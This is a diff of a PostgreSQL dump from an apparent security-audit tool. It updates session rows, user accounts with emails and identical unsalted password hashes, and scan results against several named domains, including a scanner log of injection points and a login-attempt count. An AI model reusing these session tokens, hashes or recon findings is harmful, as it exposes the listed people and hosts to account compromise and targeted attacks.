 18	7	1	1
 18	9	1	1
+19	46	1	1
+19	1	1	1
+19	3	1	1
+19	45	1	1
+19	6	1	1
+19	7	1	1
+19	9	1	1
+19	10	1	1
+19	12	1	1
+19	13	1	1
+19	15	1	1
+19	16	1	1
+19	8	1	1
+19	11	1	1
+19	14	1	1
+19	5	1	1
+19	17	1	1
+19	18	1	1
+19	19	1	1
+19	20	1	1
+19	21	1	1
+19	22	1	1
+19	23	1	1
+19	24	1	1
+19	25	1	1
+19	26	1	1
+19	27	1	1
+19	28	1	1
+19	29	1	1
+19	30	1	1
+19	31	1	1
+19	32	1	1
+19	33	1	1
+19	34	1	1
+19	35	1	1
+19	36	1	1
+19	37	1	1
+19	38	1	1
+19	39	1	1
+19	40	1	1
+19	41	1	1
+19	42	1	1
+19	43	1	1
 \.
 
 
@@ -2372,7 +2433,8 @@ COPY risk_templates_l10n (risk_template_id, language_id, name) FROM stdin;
 --
 
 COPY sessions (id, expire, data) FROM stdin;
-7lf53hikivec4d4tv83etkh241      	1353504742	SoVzaEExQfRtqu_Hs2kTuL_UcKdeTPJt9CCxs5YnfIlLAdReoxslcKmi_XHUX1eMKBqtpE-9BuzImm96zjVkRGFHp2USN0EnAB1nwnGLqspc718yQHQhckDRZj2uMdf4qcaVUtDQAynvWKpY9E2_omXAaLKKfTDLwmyZc5RfA06qrZbt2uKJhmh18Xcy77xp22KcccAeGGAf1m-aqTtRNp7p1Mpm-sIynWX7gEETpVoehXixu7fR1576s4Y5-WMZSj8C336nxde-HxzV5AVbOXkW_VtCGk1WRHeHMBrMvIHPOZpFkmtoFN88jvam1TK1dtwxxEaTpYpYnpG3Sdz1gQ..
+62js20os2jreuej9blu44av8i1      	1354172498	N2kB8hsPS7SgkjBbG2hD52-zegdGKz4uNg0l-dvM0HPz9fwhmDCaKTwsxSXcd3CJUvUf4hcug52aOmXOrVEm49CfmoSMK85AnUVsBxVTih7F29IdIqr75nj6vVSiyH5TMuFE__OP8QtjygVXKS89F0DhzDYVjBUeWRkDYP8MJKUhscEjMjezooLe59rHD2h7BNsx98aLFmL2-tu8A4jD6kobugBqYRGEBbz8Xe3ouOnp3dF0WGynOJk-kCTTzRfwtBocY37d68BOW9jz9SCzbfhCTDpxC077SSxqeN49Twrh0F2Q4zxq4W6hH9FZKBvM
+o7if4mfgdptl0vk1g8s5gcl0v6      	1354169238	snbZn79eKIaltbLBA8GASqzTEsOI3YhczMCiasesHpI32B90p5FoP0QZSaQyxFV6mWIJZw7SR-rQwhocmS17bhQBOIcrsQkr634Mx7vHB3nv8-QpVoQV-74rm-JxNh1oaIKhC3jrUG0m7l1uLlz3YDZmssHVzmjlUHb331HCFgz2r66sm2o03QOcrg09PYcofHr6n1QtDppdXDtV9nnzEg..
 \.
 
 
@@ -2383,7 +2445,7 @@ COPY sessions (id, expire, data) FROM stdin;
 --
 
 COPY system (id, backup) FROM stdin;
-1	2012-09-26 03:27:20.05409
+1	2012-11-21 17:55:00.535688
 \.
 
 
@@ -2406,21 +2468,21 @@ COPY target_check_attachments (target_id, check_id, name, type, path, size) FROM
 --
 
 COPY target_check_categories (target_id, check_category_id, advanced, check_count, finished_count, low_risk_count, med_risk_count, high_risk_count, info_count) FROM stdin;
-6	6	t	18	3	0	1	0	2
-1	1	t	15	15	5	4	0	1
-1	2	t	1	1	0	0	0	1
-2	3	t	4	0	0	0	0	0
+1	1	t	15	14	4	4	0	1
+2	6	t	18	4	0	1	0	2
 4	1	t	15	0	0	0	0	0
 5	1	t	15	0	0	0	0	0
+6	6	t	18	3	0	1	0	2
+1	2	t	1	1	0	0	0	1
+1	11	t	1	0	0	0	0	0
+2	3	t	4	0	0	0	0	0
 1	8	t	0	0	0	0	0	0
-1	11	t	0	0	0	0	0	0
 1	3	t	4	0	0	0	0	0
 1	4	t	1	0	0	0	0	0
 1	5	t	3	0	0	0	0	0
 1	10	t	0	0	0	0	0	0
 1	6	t	18	1	0	0	0	0
 1	9	t	1	1	1	0	0	0
-2	6	t	18	4	0	1	0	2
 \.
 
 
@@ -2442,10 +2504,10 @@ COPY target_check_inputs (target_id, check_input_id, value, file, check_id) FROM
 1	12	\N	\N	13
 1	13	0	\N	15
 1	14	0	\N	16
-1	1	\N	\N	1
 1	7	0	\N	6
 1	42	google.com	\N	45
 2	31	10	\N	26
+1	1	\N	fd7672e8249e025004f2067b1c93be8901a58d96a4a07eec8f6a6f53ff878df8	1
 \.
 
 
@@ -2479,7 +2541,6 @@ COPY target_checks (target_id, check_id, result, target_file, rating, started, p
 1	8	\N	\N	low_risk	\N	\N	finished	\N	1	\N	\N	\N	1
 1	5	\N	\N	med_risk	\N	\N	finished	\N	1	\N	\N	\N	1
 1	17	\N	\N	info	\N	\N	finished	\N	1	\N	\N	\N	1
-1	1	\N	\N	low_risk	\N	\N	finished	\N	1	\N	\N	\N	1
 1	10	\N	\N	med_risk	\N	\N	finished	\N	1	\N	\N	\N	1
 1	12	\N	\N	low_risk	\N	\N	finished	\N	1	\N	\N	\N	1
 1	13	\N	\N	med_risk	\N	\N	finished	\N	1	\N	\N	\N	1
@@ -2501,6 +2562,8 @@ COPY target_checks (target_id, check_id, result, target_file, rating, started, p
 6	30	\N	\N	med_risk	\N	\N	finished	\N	1	http	\N	\N	1
 1	27	tried 879 time(s) with 0 successful time(s)\n	a3451332975f5af76b527ca807fc11cacb7a04d74650399d97b8631894871cc3	\N	2012-11-14 10:03:14.471584	\N	finished	eb1c5ad290d413e89ff0218759ea95776bdb5eb9ef339176fbd86d7c59cb8452	1	\N	\N	onexchanger.com	1
 1	46	Auto-enabling plugin: grep.httpAuthDetect\nThe URL: "http://demonstratr.com" has <form> element with autocomplete capabilities.\nThe URL: "http://demonstratr.com/" has <form> element with autocomplete capabilities.\nNew URL found by webSpider plugin: http://demonstratr.com/\nNew URL found by webSpider plugin: http://demonstratr.com/redirect.php\nNew URL found by webSpider plugin: http://demonstratr.com/x.php\nFound 4 URLs and 7 different points of injection.\nThe list of URLs is:\n- http://demonstratr.com\n- http://demonstratr.com/\n- http://demonstratr.com/redirect.php\n- http://demonstratr.com/x.php\nThe list of fuzzable requests is:\n- http://demonstratr.com | Method: GET\n- http://demonstratr.com/ | Method: GET\n- http://demonstratr.com/ | Method: POST | Parameters: (login="", password="")\n- http://demonstratr.com/redirect.php | Method: GET | Parameters: (url="www")\n- http://demonstratr.com/redirect.php | Method: GET | Parameters: (url="www.google...")\n- http://demonstratr.com/x.php | Method: GET | Parameters: (go="www")\n- http://demonstratr.com/x.php | Method: GET | Parameters: (go="www.bing.c...")\nScan finished in 3 seconds.\n	13de8523bc591c0c649d9faa04c7bd299c43b307e8f7b21645e641dff0d67796	low_risk	2012-10-16 14:29:52.476709	\N	finished	d2183750509d6b7d48c8b699f53ec860936265c9479ac60b4d894bff0ed77f7e	1	\N	\N	demonstratr.com	1
+1	47	No output.	daff9c357f092f45dd347a9ceb199488924a8148820d568eaede13a94728f2a1	\N	2012-11-26 07:09:01.609125	\N	finished	f08845086cba4dc36b7eaccd7071742540942bef7383300185ccb93211904cc6	1	http	80	infoguard.com	1
+1	1	TypeError: main() takes exactly 1 argument (2 given)\n	e8dbd7c26bd33fa4794b6c0b00a6dddd76f771d652d7843554fe95c60bd63f17	\N	2012-11-26 03:44:01.832243	\N	finished	0aaaed3bc1b89672d4d4119323dd22a66842a726797b55fa4f45bce76d46988e	1	\N	\N	lenta.ru	1
 \.
 
 
@@ -2544,8 +2607,8 @@ COPY targets (id, project_id, host, description) FROM stdin;
 
 COPY users (id, email, password, name, client_id, role) FROM stdin;
 1	oliver@muenchow.ch	a665a45920422f9d417e4867efdc4fb8a04a1f3fff1fa07e998e86f7f7a27ae3	Oliver Muenchow	\N	admin
-3	erbol.turburgaev@gmail.com	a665a45920422f9d417e4867efdc4fb8a04a1f3fff1fa07e998e86f7f7a27ae3		\N	user
 2	test@client.com	a665a45920422f9d417e4867efdc4fb8a04a1f3fff1fa07e998e86f7f7a27ae3		1	client
+3	erbol.turburgaev@gmail.com	a665a45920422f9d417e4867efdc4fb8a04a1f3fff1fa07e998e86f7f7a27ae3		\N	user
 \.
 
 
@@ -3230,7 +3293,7 @@ ALTER TABLE ONLY report_template_summary
 
 
 --
--- TOC entry 2186 (class 2606 OID 27395)
+-- TOC entry 2186 (class 2606 OID 28004)
 -- Dependencies: 162 194 2079
 -- Name: report_templates_l10n_language_id_fkey; Type: FK CONSTRAINT; Schema: public; Owner: gtta
 --
@@ -3240,7 +3303,7 @@ ALTER TABLE ONLY report_templates_l10n
 
 
 --
--- TOC entry 2187 (class 2606 OID 27400)
+-- TOC entry 2187 (class 2606 OID 28009)
 -- Dependencies: 194 2123 193
 -- Name: report_templates_l10n_report_template_id_fkey; Type: FK CONSTRAINT; Schema: public; Owner: gtta
 --
@@ -3581,7 +3644,7 @@ GRANT ALL ON SCHEMA public TO postgres;
 GRANT ALL ON SCHEMA public TO PUBLIC;
 
 
--- Completed on 2012-11-21 16:34:28 MSK
+-- Completed on 2012-11-29 10:02:46 MSK
 
 --
 -- PostgreSQL database dump complete
